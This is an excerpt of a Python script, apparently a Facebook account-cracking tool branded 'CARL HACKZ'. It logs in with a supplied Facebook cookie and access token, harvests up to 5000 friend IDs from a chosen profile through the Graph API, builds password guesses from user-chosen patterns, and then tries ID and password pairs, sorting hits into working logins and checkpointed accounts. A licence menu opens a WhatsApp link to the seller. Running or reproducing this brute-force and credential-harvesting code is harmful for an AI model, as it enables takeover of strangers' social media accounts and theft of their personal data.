...
# INDICATION
id,id2,loop,ok,cp,account,oprek,method,mylicense,tapp,mytoken,uid,mylicense= [],[],0,0,0,[],[],[],[], [],[],[],[]
cockbrut=[]
pwpluss,pwnya=[],[]
...
def license():#line:42
  try :#line:43
    ...
    os .system ('clear')
    print (f"""
{U}[{H}1{U}]{H} Chat Admin to request a license
{U}[{H}2{U}]{H} Enter License
""")#line:49
    OOO00O0OOO00OO00O =input (f"{H}[{H}?{H}]{H} Choose :{K} ")#line:50
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      print (f"{H}[{H}!{H}]{H} Send Message..");time .sleep (3 );os.system('xdg-open wa.me/+639267932793?text=bang');exit ()#line:52
...
'''
	...
	cetak(nel(oi, title='[bold cyan] • DEVELOPER INFORMATION • [/bold cyan]'))
# VALID TOKEN
def login():
		try:
			...
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+mytoken[0], cookies={'cookie':cookies})
...
def login_lagi334():
	try:
		banner()
		___CarlHackz___ = input('[|] Fb id  Cookies : ')
...
[07] CHECK CHECKPOINT OPTIONS (CARL HACKZ)
...
def dump_publik():
	...
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+mytoken[0],cookies={'cookie': kukis}).json()
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: CARL@_@,CARLHACKZ#_#,ALMIGHTYCARL*_*'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(check))
					nok=1
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP CARL CRACK    %s'%(b,idf,pw,x))
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> CP CARL TOOL    %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options %s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK CARL TOOL   %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> CARL TOOL    %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
